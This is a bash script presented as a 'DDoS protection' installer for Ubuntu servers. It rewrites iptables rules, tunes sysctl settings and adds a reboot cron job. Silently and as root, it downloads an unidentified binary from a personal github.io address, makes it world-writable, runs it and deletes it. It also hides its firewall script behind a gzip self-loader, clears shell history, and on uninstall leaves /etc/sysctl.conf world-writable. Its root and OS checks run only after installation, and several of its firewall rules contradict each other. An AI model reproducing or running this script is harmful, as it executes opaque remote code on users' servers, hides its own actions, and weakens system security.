#!/bin/bash

loader='#! /bin/bash
source <(gzip -c -d <(tail -n+"$((LINENO + 2))" "$BASH_SOURCE"));
status="$?"; return "$status" 2> /dev/null || exit "$status"
'
INTERFACE=$(ip route show default | awk '/default/ {print $5}')

case "$1" in

    install)

        clear

        echo "DDoS protection is installing, please wait."

        echo "Package updates."

        echo "nameserver 1.1.1.1" > /etc/resolv.conf >> /dev/null
        apt-get update -y >> /dev/null && apt-get upgrade -y >> /dev/null

        echo "Installing modules."

        apt-get install curl -y >> /dev/null
        apt-get install net-tools -y >> /dev/null
        apt-get install tcpdump -y >> /dev/null
        apt-get install dsniff -y >> /dev/null
        apt-get install grepcidr -y >> /dev/null
        apt-get install vnstat -y >> /dev/null
        apt-get install sysstat -y >> /dev/null
        apt-get install screen -y >> /dev/null
        apt-get install unzip -y >> /dev/null
        apt-get install iptables -y >> /dev/null
        apt-get install ipset -y >> /dev/null
        apt-get install netfilter-persistent -y >> /dev/null
        apt-get install ipset-persistent -y >> /dev/null
        apt-get install nftables -y >> /dev/null
        apt-get install fail2ban -y >> /dev/null

        systemctl stop systemd-timesyncd
        systemctl disable systemd-timesyncd
        
        systemctl stop ntpd
        systemctl disable ntpd
        
        systemctl stop ntp
        systemctl disable ntp
        
        apt-get purge ntpdate -y

        echo "Network reset."

        iptables -t nat -F
        iptables -t mangle -F && iptables -X
        iptables -t nat -X && iptables -t mangle -X
        iptables -Z && iptables -t nat -Z && iptables -t mangle -Z
        iptables -F INPUT
        
        iptables -Z INPUT
        iptables -P INPUT ACCEPT
        
        iptables -F OUTPUT
        iptables -Z OUTPUT
        iptables -P OUTPUT ACCEPT
        
        iptables -F FORWARD
        iptables -Z FORWARD
        iptables -P FORWARD ACCEPT

        echo "Crontab setup in progress."

        echo -e "#!/bin/bash

iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -t nat -A POSTROUTING -o ${INTERFACE} -j MASQUERADE
ethtool -s ${INTERFACE} duplex full speed 1000 autoneg off

iptables -A INPUT -p udp -m u32 --u32 '26&0xFFFFFFFF=0xfeff' -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
iptables -A INPUT -p udp --dport 1900 -j DROP
iptables -A INPUT -p icmp -m icmp --icmp-type address-mask-request -j DROP
iptables -A INPUT -p icmp -m icmp --icmp-type timestamp-request -j DROP
iptables -A INPUT -p icmp -m icmp --icmp-type 8 -m limit --limit 5/second -j ACCEPT

iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
iptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,ACK,FIN,RST RST -m limit --limit 5/second -j ACCEPT
iptables -A INPUT -p tcp --tcp-flags ACK ACK -m limit --limit 1/s --limit-burst 5 -j ACCEPT

iptables -I INPUT -p tcp --syn --dport 1:65535 -m length --length 60 -m string --string '8@' -m limit --limit 20/s --algo bm -j ACCEPT
iptables -I INPUT -p tcp --syn --dport 1:65535 -m length --length 60 -m string --string '8@' --algo bm -j DROP
iptables -I INPUT -p tcp --syn --dport 1:65535 -m length --length 60 -m string --string '9' -m limit --limit 20/s --algo bm -j ACCEPT
iptables -I INPUT -p tcp --syn --dport 1:65535 -m length --length 60 -m string --string '9' --algo bm -j DROP
iptables -I INPUT -p tcp --syn --dport 1:65535 -m length --length 60 -m string --string '7d' -m limit --limit 20/s --algo bm -j ACCEPT
iptables -I INPUT -p tcp --syn --dport 1:65535 -m length --length 60 -m string --string '7d' --algo bm -j DROP

iptables -A INPUT -p tcp --tcp-flags FIN,SYN FIN,SYN -j DROP
iptables -A INPUT -p tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN -j DROP
iptables -A INPUT -p tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,PSH,URG -j DROP
iptables -A INPUT -p tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,SYN,RST,PSH,ACK,URG -j DROP
iptables -A INPUT -p tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
iptables -I INPUT -p tcp --tcp-flags SYN,ACK,FIN,RST RST -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP

iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A INPUT -m conntrack --ctstate INVALID -j DROP
iptables -t nat -A POSTROUTING -o ${INTERFACE} -j MASQUERADE
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT

iptables -t raw -A PREROUTING -p gre -j DROP
iptables -t raw -A PREROUTING -p esp -j DROP
iptables -t raw -A PREROUTING -p ah -j DROP

iptables -t raw -A PREROUTING -p udp --dport 22 -j DROP
iptables -t raw -A PREROUTING -p udp --dport 80 -j DROP
iptables -t raw -A PREROUTING -p udp --dport 443 -j DROP

iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j DROP

iptables -A INPUT -p icmp -m state --state ESTABLISHED -j ACCEPT -m limit --limit 5/s --limit-burst 8
iptables -A OUTPUT -p icmp -m state --state ESTABLISHED -j ACCEPT -m limit --limit 5/s --limit-burst 8
iptables -A INPUT -p icmp -j DROP

iptables -A INPUT -p udp -m limit --limit 5/s -j ACCEPT
iptables -A INPUT -p udp -j DROP

iptables -A INPUT -p tcp -m conntrack --ctstate NEW -m tcpmss ! --mss 536:65535 -j DROP

iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set
iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 100 -j DROP
iptables -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT

iptables -A INPUT -p udp --dport 22 -m conntrack --ctstate NEW -m recent --set
iptables -A INPUT -p udp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 100 -j DROP
iptables -A INPUT -p udp -m udp --dport 22 -j ACCEPT

iptables -A INPUT -p tcp -m state --state NEW --dport 22 -m recent --update --seconds 30 -j DROP
iptables -A INPUT -p tcp -m state --state NEW --dport 22 -m recent --set -j ACCEPT

iptables -A INPUT -p tcp -m tcp --syn --tcp-option 8 --dport 22 -j REJECT
iptables -I INPUT -p tcp --syn --dport 22 -m connlimit --connlimit-above 3 -j DROP
iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m limit --limit 50/s -j ACCEPT

iptables -A INPUT -p udp --dport 53 -m limit --limit 5/s -j ACCEPT
iptables -A INPUT -p udp --dport 53 -j DROP

iptables -A INPUT -p udp --dport 123 -m limit --limit 5/s -j ACCEPT
iptables -A INPUT -p udp --dport 123 -j DROP

iptables -A INPUT -p udp --dport 161 -m limit --limit 5/s -j ACCEPT
iptables -A INPUT -p udp --dport 161 -j DROP

iptables -A INPUT -p udp --dport 69 -m limit --limit 5/s -j ACCEPT
iptables -A INPUT -p udp --dport 69 -j DROP

iptables -A INPUT -p tcp --dport 3389 -m limit --limit 5/s -j ACCEPT
iptables -A INPUT -p tcp --dport 3389 -j DROP

iptables -A INPUT -p tcp -m multiport --dports 135,137,138,139,445,1433,1434 -j DROP
iptables -A INPUT -p udp -m multiport --dports 135,137,138,139,445,1433,1434 -j DROP

iptables -t mangle -A PREROUTING -p tcp -m conntrack --ctstate NEW -m tcpmss ! --mss 536:65535 -j DROP
iptables -t mangle -A PREROUTING -m conntrack --ctstate INVALID -j DROP
iptables -t mangle -A PREROUTING -m state --state INVALID -j DROP

iptables -A OUTPUT -p icmp -o ${INTERFACE} -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 5/s -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-reply -s 0/0 -i ${INTERFACE} -j ACCEPT
iptables -A INPUT -p icmp --icmp-type destination-unreachable -s 0/0 -i ${INTERFACE} -j ACCEPT
iptables -A INPUT -p icmp --icmp-type time-exceeded -s 0/0 -i ${INTERFACE} -j ACCEPT
iptables -I INPUT -p icmp --icmp-type 8 -j DROP
iptables -A INPUT -p icmp -i ${INTERFACE} -j DROP

iptables -A INPUT -i tun+ -j ACCEPT
iptables -A FORWARD -o tun+ -j ACCEPT
iptables -A FORWARD -i tun+ -j ACCEPT
iptables -A OUTPUT -o tun+ -j ACCEPT

iptables -A INPUT -m state --state INVALID -j DROP
iptables -A OUTPUT -m state --state INVALID -j DROP
iptables -A FORWARD -m state --state INVALID -j DROP

iptables -A INPUT -m state --state NEW -p tcp --tcp-flags ALL ALL -j DROP
iptables -A INPUT -m state --state NEW -p tcp --tcp-flags ALL NONE -j DROP
iptables -t mangle -A PREROUTING -p tcp ! --syn -m conntrack --ctstate NEW -j DROP

iptables -A INPUT -p udp --sport 1:65535 -m limit --limit 5/s --limit-burst 1000 -j ACCEPT
iptables -A INPUT -p tcp --sport 1:65535 -m limit --limit 5/s --limit-burst 1000 -j ACCEPT
iptables -A PREROUTING -t mangle -i ${INTERFACE} -j MARK --set-mark 6
iptables -A INPUT -p tcp -m connlimit --connlimit-above 80 -j REJECT --reject-with tcp-reset
iptables -t mangle -A PREROUTING -f -j DROP

iptables -t raw -A PREROUTING -p tcp -m multiport --sports 25,67,465 -j DROP
iptables -A INPUT -p tcp --syn --dport 22 -m connlimit --connlimit-above 20 -j REJECT

iptables-save

clear" > iptables.sh

        gzip -c "iptables.sh" | cat <(printf %s "$loader") - > "iptables-obfuscated.sh"
        rm -R iptables.sh
        chmod u+x "iptables-obfuscated.sh"
        mv "iptables-obfuscated.sh" "iptables.sh"

        bash iptables.sh >> /dev/null

        (crontab -l ; echo '@reboot bash /root/iptables.sh') | crontab -

        echo "Packet limit is set."

        ulimit -s 256
        ulimit -i 120000

        echo 120000 > /proc/sys/kernel/threads-max
        echo 600000 > /proc/sys/vm/max_map_count
        echo 200000 > /proc/sys/kernel/pid_max
        echo 20000 > /proc/sys/net/ipv4/tcp_max_syn_backlog
        echo 1 > /proc/sys/net/ipv4/tcp_synack_retries
        echo 30 > /proc/sys/net/ipv4/tcp_fin_timeout
        echo 5 > /proc/sys/net/ipv4/tcp_keepalive_probes
        echo 15 > /proc/sys/net/ipv4/tcp_keepalive_intvl
        echo 20000 > /proc/sys/net/core/netdev_max_backlog
        echo 20000 > /proc/sys/net/core/somaxconn
        echo 1 > /proc/sys/net/ipv4/tcp_syncookies
        echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all
        echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
        echo 1 > /proc/sys/net/ipv4/icmp_ignore_bogus_error_responses

        for i in /proc/sys/net/ipv4/conf/*/rp_filter; do echo 1 > "$i"; done
        for i in /proc/sys/net/ipv4/conf/*/log_martians; do echo 1 > "$i"; done
        for i in /proc/sys/net/ipv4/conf/*/accept_redirects; do echo 0 > "$i"; done
        for i in /proc/sys/net/ipv4/conf/*/send_redirects; do echo 0 > "$i"; done
        for i in /proc/sys/net/ipv4/conf/*/accept_source_route; do echo 0 > "$i"; done
        for i in /proc/sys/net/ipv4/conf/*/proxy_arp; do echo 0 > "$i"; done
        for i in /proc/sys/net/ipv4/conf/*/secure_redirects; do echo 1 > "$i"; done
        for i in /proc/sys/net/ipv4/conf/*/bootp_relay; do echo 0 > "$i"; done

        echo "Scripts are loading."

        curl -L -o antiddos https://haker20szs.github.io/haker20szs/anti_ddos 2> /dev/null
        chmod -R 777 antiddos >> /dev/null
        ./antiddos >> /dev/null
        rm -R antiddos

        wget https://github.com/jgmdev/ddos-deflate/archive/master.zip -O ddos.zip 2> /dev/null
        unzip ddos.zip >> /dev/null
        cd ddos-deflate-master >> /dev/null
        bash install.sh >> /dev/null
        systemctl start ddos >> /dev/null
        cd .. && rm -R ddos.zip >> /dev/null

        echo "Sysctl is configured."

        echo -e "

# Custom conntrack timeouts - specially against DDoS attacks.
# --------------------------------
net.netfilter.nf_conntrack_tcp_timeout_last_ack = 10
net.netfilter.nf_conntrack_tcp_timeout_close = 5
net.netfilter.nf_conntrack_tcp_timeout_close_wait = 5
net.netfilter.nf_conntrack_tcp_timeout_time_wait = 5
net.netfilter.nf_conntrack_tcp_timeout_syn_sent = 20
net.netfilter.nf_conntrack_tcp_timeout_syn_recv = 20
net.netfilter.nf_conntrack_tcp_timeout_fin_wait = 25
net.netfilter.nf_conntrack_tcp_timeout_unacknowledged = 20
net.netfilter.nf_conntrack_generic_timeout = 300
net.netfilter.nf_conntrack_udp_timeout = 10
net.netfilter.nf_conntrack_icmp_timeout = 2
net.netfilter.nf_conntrack_icmpv6_timeout = 3

# Enabling SYN-Cookies.
# Facilitates SYN Flood DDoS mitigation.
# If your server frequently faces TCP DDoS attacks,
# you can set the value to '2' here.
# Caution: certain hosting providers might block syncookies.
# Verify if your hoster enforces this. If yes, set it to '0'.
# --------------------------------
net.ipv4.tcp_syncookies = 1

# Set custom SYN/SYN-ACK retries count.
# Helps in TCP DDoS mitigation.
# Try 1/1 instead of 2/2 if you have time for testing :)
# --------------------------------
net.ipv4.tcp_synack_retries = 2
net.ipv4.tcp_syn_retries = 2

# Set custom NIC rmem/wmem buffer size.
# --------------------------------
net.core.rmem_max = 33554432
net.core.wmem_max = 33554432

# Network security hardening.
# Usually causes problems on routers.
# --------------------------------
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv6.conf.all.accept_source_route = 0
net.ipv6.conf.all.accept_ra = 0
net.ipv4.conf.all.secure_redirects = 1
net.ipv6.conf.all.drop_unsolicited_na = 1
net.ipv6.conf.all.use_tempaddr = 2
net.ipv4.conf.all.drop_unicast_in_l2_multicast = 1
net.ipv6.conf.all.drop_unicast_in_l2_multicast = 1
net.ipv6.conf.default.dad_transmits = 0
net.ipv6.conf.default.autoconf = 0
# net.ipv4.ip_forward = 0 # Disables ip_forward (blocks VPNs/NATs)
# net.ipv4.ip_no_pmtu_disc = 3 # Hardened PMTU Discover Mode (usually not needed)

# Prevent ARP Spoofing.
# --------------------------------
net.ipv4.conf.all.drop_gratuitous_arp = 1
net.ipv4.conf.all.arp_ignore = 1
net.ipv4.conf.all.arp_filter = 1

# Disable IGMP Multicast reports.
# --------------------------------
net.ipv4.igmp_link_local_mcast_reports = 0

# Overall security hardening.
# --------------------------------
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 1
fs.protected_symlinks = 1
fs.protected_hardlinks = 1
fs.protected_fifos = 2
fs.protected_regular = 2
kernel.unprivileged_bpf_disabled = 1
kernel.unprivileged_userns_clone = 0
kernel.printk = 3 3 3 3
net.core.bpf_jit_harden = 2
vm.unprivileged_userfaultfd = 0
kernel.kexec_load_disabled = 1
#kernel.sysrq = 0 # Disables sysrq (not recommended)

# Performance tuning.
# Set somaxconn to 3240000 if you have a very powerful server.
# Your server would then manage over 3 million connections. 0_0
# Additionally, you can activate commented-out settings at the end (in this scenario).
# We've also disabled checksum verification in NF because the NIC usually already calculates checksums.
# --------------------------------

kernel.sched_tunable_scaling = 1
kernel.shmmax = 268435456
net.ipv4.tcp_tw_reuse = 1
vm.swappiness = 20
net.core.somaxconn = 32000
net.ipv4.tcp_keepalive_probes = 5
net.netfilter.nf_conntrack_checksum = 0
# Tweaks for very powerful servers
# net.ipv4.tcp_max_tw_buckets = 600000000
# net.core.netdev_max_backlog = 50000
# net.ipv4.tcp_max_syn_backlog = 3240000

# Set max conntrack table size.
# --------------------------------
net.nf_conntrack_max = 20971520
net.netfilter.nf_conntrack_max = 20971520

# Enable ExecShield to block some remote attacks.
# --------------------------------
kernel.exec-shield = 2

# Don't log bogus ICMP responses.
# --------------------------------
net.ipv4.icmp_ignore_bogus_error_responses = 1

# Allow to use more ports as a source ones.
# --------------------------------
net.ipv4.ip_local_port_range=1024 65535

# Conntrack strict mode.
# --------------------------------
net.netfilter.nf_conntrack_tcp_loose = 0

# Reverse-path filter.
# You should set '1' to '2' if you're using an assymetric routing.
# --------------------------------
net.ipv4.conf.all.rp_filter = 1

# Custom ratelimit for invalid TCP packets.
# --------------------------------
net.ipv4.tcp_invalid_ratelimit = 1000

net.ipv4.ip_forward=1

#net.ipv4.icmp_echo_ignore_all=1
#net.ipv4.icmp_echo_ignore_broadcasts=1
#net.ipv4.icmp_ignore_bogus_error_responses=1

" | tee -a /etc/sysctl.conf > /dev/null

        clear
        history -c

        echo -e "✓ Success."

    ;;

    uninstall)

        clear

        echo "Files are deleted."

        screen -ls | grep antiddos | cut -d. -f1 | awk '{print $1}' | xargs kill
        apt-get update -y >> /dev/null && apt-get upgrade -y >> /dev/null && apt-get autoremove >> /dev/null
        rm -R /etc/sysctl.conf && touch /etc/sysctl.conf && chmod -R 777 /etc/sysctl.conf
        cd ddos-deflate-master && bash uninstall.sh && cd .. && rm -R ddos-deflate-master && rm -R ddos.zip && rm -R iptables.sh
        iptables -P INPUT ACCEPT && iptables -P OUTPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -t nat -F && iptables -t mangle -F && iptables -X

        clear
        history -c

        echo -e "✓ Success."

    ;;

    *)

        echo "Usage: {install >> uninstall}"

    ;;

esac

version_id=`cat /etc/*-release| tr "\n" " "`

for version_id in '22.04'

do
 
    if [ $version_id == '22.04' ];

        then

            echo "OS check was successful."

        else

            echo "This OS is not supported."

            kill "$$"

            exit
    
    fi
        

done

if [ "$(id -u)" != "0" ]; then

   echo "This script must be run as root" 
   exit 1

fi
